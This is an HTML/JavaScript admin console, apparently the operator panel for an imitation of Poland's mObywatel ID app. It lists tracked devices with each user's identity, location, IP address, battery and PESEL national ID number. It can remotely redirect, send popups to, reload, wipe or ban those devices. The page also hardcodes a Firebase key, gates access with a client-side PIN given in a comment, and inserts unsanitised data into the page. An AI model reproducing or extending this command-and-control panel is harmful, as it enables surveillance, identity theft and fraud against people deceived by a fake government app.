<!DOCTYPE html>
<html lang="pl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Admin Console - mObywatel</title>

<!-- Firebase Compat -->
<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>

<style>
@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&family=Roboto:wght@400;700&display=swap');

:root {
    --bg: #0a0a0f;
    --card-bg: #12121a;
    --green: #00ff41;
    --border: #1a1a24;
}

body {
    margin: 0;
    font-family: 'JetBrains Mono', monospace;
    background: var(--bg);
    color: #fff;
    padding: 20px;
}

.header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    border-bottom: 1px solid var(--green);
    padding-bottom: 10px;
    margin-bottom: 20px;
}

h1 { font-size: 18px; color: var(--green); margin: 0; }

.stats-bar { font-size: 12px; color: #666; margin-bottom: 20px; }

.device-card {
    background: var(--card-bg);
    border: 1px solid var(--border);
    border-radius: 8px;
    padding: 15px;
    margin-bottom: 15px;
    position: relative;
    overflow: hidden;
}

.device-card.online { border-left: 4px solid var(--green); }
.device-card.offline { border-left: 4px solid #444; }

.card-header {
    display: flex;
    justify-content: space-between;
    margin-bottom: 10px;
}

.name { font-size: 16px; font-weight: 700; color: var(--green); }
.status-pill { font-size: 10px; padding: 2px 6px; border-radius: 4px; font-weight: bold; }
.status-online { background: rgba(0, 255, 65, 0.1); color: var(--green); }
.status-offline { background: rgba(255, 255, 255, 0.05); color: #888; }

.info-grid {
    display: grid;
    grid-template-columns: 1fr 1fr;
    gap: 8px;
    font-size: 11px;
}

.info-item b { color: #888; display: block; font-size: 9px; text-transform: uppercase; }

.controls {
    margin-top: 15px;
    display: flex;
    flex-wrap: wrap;
    gap: 10px;
    padding-top: 10px;
    border-top: 1px solid var(--border);
}

.cmd-input {
    background: #000;
    border: 1px solid #333;
    color: var(--green);
    padding: 4px 8px;
    font-family: inherit;
    font-size: 11px;
    flex: 1;
}

button {
    background: #1a1a24;
    border: 1px solid #333;
    color: #fff;
    padding: 5px 10px;
    font-family: inherit;
    font-size: 11px;
    cursor: pointer;
}

button:hover { background: var(--green); color: #000; }
.btn-danger:hover { background: #ff4444; color: #fff; }

.empty-msg { text-align: center; color: #444; margin-top: 50px; }
</style>
</head>
<body>

<div class="header">
    <h1>MOBYWATEL ADMIN CONSOLE v2.0</h1>
    <a href="more.html" style="color:#666; text-decoration:none; font-size:12px;">[ WYJDŹ ]</a>
</div>

<div class="stats-bar" id="stats">Ładowanie systemów...</div>

<div id="devices-container">
    <p class="empty-msg">Skanowanie sieci...</p>
</div>

<script>
// --- KONFIGURACJA ---
const firebaseConfig = {
  apiKey: "AIzaSyBaPHJSgHSBlT503b6EJxvgdeFJ2sxUuoY",
  authDomain: "obywatel-polski.firebaseapp.com",
  projectId: "obywatel-polski",
  storageBucket: "obywatel-polski.firebasestorage.app",
  messagingSenderId: "146396600602",
  appId: "1:146396600602:web:cd845989d2a6bfade034a3"
};

// Inicjalizacja
if (!firebase.apps.length) {
    firebase.initializeApp(firebaseConfig);
}
const db = firebase.firestore();

// Sprawdź Auth
if (sessionStorage.getItem('adminAuth') !== 'true') {
    let pin = prompt("AUTORYZACJA WYMAGANA. WPISZ PIN:");
    if (pin && btoa(pin) === "ODQ2Mg==") { // PIN: 8462
        sessionStorage.setItem('adminAuth', 'true');
    } else {
        window.location.href = "index.html";
    }
}

// Renderowanie
function render(docs) {
    const container = document.getElementById('devices-container');
    document.getElementById('stats').innerText = `ZAREJESTROWANE URZĄDZENIA: ${docs.length}`;
    
    if (docs.length === 0) {
        container.innerHTML = '<p class="empty-msg">BRAK URZĄDZEŃ W BAZIE.</p>';
        return;
    }

    container.innerHTML = '';
    
    docs.forEach(doc => {
        const d = doc.data();
        const id = doc.id;
        const isOnline = (Date.now() - d.lastSeen) < 60000;
        
        const card = document.createElement('div');
        card.className = `device-card ${isOnline ? 'online' : 'offline'}`;
        card.innerHTML = `
            <div class="card-header">
                <div class="name">${d.identity || 'ANONIM'}</div>
                <div class="status-pill ${isOnline ? 'status-online' : 'status-offline'}">${isOnline ? 'ONLINE' : 'OFFLINE'}</div>
            </div>
            
            <div class="info-grid">
                <div class="info-item"><b>Lokalizacja</b>${d.location || '---'}</div>
                <div class="info-item"><b>IP Address</b>${d.ip || '---'}</div>
                <div class="info-item"><b>Aktualna strona</b>${d.currentPage || '---'}</div>
                <div class="info-item"><b>Urządzenie</b>${d.name || '---'}</div>
                <div class="info-item"><b>Bateria</b>${d.battery || '---'}</div>
                <div class="info-item"><b>PESEL</b>${d.pesel || '---'}</div>
            </div>

            <div class="controls">
                <input type="text" id="in_${id}" class="cmd-input" placeholder="Wpisz URL lub wiadomość...">
                <button onclick="send('${id}', 'redirect')">PRZEKIERUJ</button>
                <button onclick="send('${id}', 'alert')">POPU-UP</button>
                <button onclick="send('${id}', 'reload')">RELOAD</button>
                <button class="btn-danger" onclick="wipe('${id}')">WIPE</button>
                <button onclick="ban('${id}')">${d.status === 'banned' ? 'UNBAN' : 'BAN'}</button>
            </div>
        `;
        container.appendChild(card);
    });
}

// Akcje
window.send = (id, type) => {
    const val = document.getElementById(`in_${id}`).value;
    db.collection('devices').doc(id).update({
        cmd: { type: type, val: val },
        cmdId: Date.now().toString()
    });
};

window.wipe = (id) => {
    if(confirm("WYCZYŚCIĆ DANE UŻYTKOWNIKA?")) {
        db.collection('devices').doc(id).update({ remoteWipe: true });
    }
};

window.ban = (id) => {
    db.collection('devices').doc(id).get().then(s => {
        const newStatus = s.data().status === 'banned' ? 'active' : 'banned';
        db.collection('devices').doc(id).update({ status: newStatus });
    });
};

// Nasłuch
db.collection('devices').orderBy('lastSeen', 'desc').onSnapshot(snap => {
    render(snap.docs);
}, err => {
    console.error("Firestore Error:", err);
    document.getElementById('devices-container').innerHTML = `<p style="color:red">BŁĄD BAZY DANYCH: ${err.message}</p>`;
});
</script>

</body>
</html>
